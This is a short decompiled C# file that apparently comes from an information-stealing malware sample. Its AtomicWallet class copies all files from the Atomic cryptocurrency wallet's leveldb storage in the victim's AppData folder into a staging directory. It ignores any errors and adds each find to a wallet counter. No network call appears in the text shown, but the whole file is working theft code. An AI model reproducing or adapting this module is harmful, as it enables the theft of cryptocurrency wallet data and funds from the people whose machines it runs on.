﻿using System;
using System.IO;

namespace SHARP
{
	// Token: 0x0200002E RID: 46
	internal class AtomicWallet
	{
		// Token: 0x060000F2 RID: 242 RVA: 0x00005DB4 File Offset: 0x00003FB4
		public static void AtomicStr(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppData + "\\atomic\\Local Storage\\leveldb\\").GetFiles())
				{
					Directory.CreateDirectory(directorypath + AtomicWallet.AtomDir);
					fileInfo.CopyTo(directorypath + AtomicWallet.AtomDir + fileInfo.Name);
				}
				AtomicWallet.count++;
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		// Token: 0x04000077 RID: 119
		public static int count = 0;

		// Token: 0x04000078 RID: 120
		public static string AtomDir = "\\Wallets\\Atomic\\Local Storage\\leveldb\\";
	}
}
